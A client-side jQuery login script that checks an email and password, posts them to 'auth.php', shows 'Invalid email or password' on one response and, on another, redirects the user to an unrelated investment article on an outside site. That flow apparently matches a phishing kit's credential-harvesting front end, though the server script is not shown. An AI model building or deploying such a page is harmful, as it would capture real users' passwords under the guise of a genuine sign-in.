$('div#regular-login-forms').keyup(function(event) {
    if (event.keyCode === 13) {
        $('button.login-button').click();
    }
});

function validateEmail(email) {
    var req = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return req.test(email.toLowerCase());
}

$('button.login-button').click(function() {
	$('button.login-button').attr({'disabled':'disabled'});
	$('.login-loading-indicator').hide();
	$('#login_e_notif').html('');
	$('#login_p_notif').html('');
	$('.text-input-input').removeClass('input-error');
	$('div.c-card--error').hide();
	
	if($.trim($('input#log_e').val()) === "") {
		$('input#log_e').addClass('input-error');
		$('#login_e_notif').html('Please enter your email');
		$('button.login-button').removeAttr('disabled');
		return false;
	}
	
	if(validateEmail($('input#log_e').val().trim())==false) {
		$('#login_e_notif').html('An email address must contain a single @');
		return false;
	}
	
	if($.trim($('input#log_p').val()) === "") {
		$('input#log_p').addClass('input-error');
		$('#login_p_notif').html('Please enter your password');
		$('button.login-button').removeAttr('disabled');
		return false;
	}
	
	
	var usr = $('input#log_e').val();
	var pwd = $('input#log_p').val();
	
	$('button.login-button').attr({'disabled':'disabled'});
	$('.login-loading-indicator').show();

	 var settings = {
        "url": "auth.php",
        "method": "POST",
        "mimeType": "multipart/form-data",
        "data": {'usr':usr, 'pwd':pwd}
    }

    $.ajax(settings).done(function (response) {
        if (response == 1) {
			$('button.login-button').removeAttr('disabled');
			$('.login-loading-indicator').hide();
			$('input#log_p').val('');
			$('#login_e_notif').html('Invalid email or password');
			$('div.c-card--error').show();
			
            return false;
        }
		if (response == 2) {
            document.location.href="https://smartasset.com/investing/what-is-an-investment-portfolio";
        }
    }).fail(function (jqXHR, textStatus, error) {
        $('#login_e_notif').html('Invalid email or password');
		$('div.c-card--error').show();
		return false;
    });	
});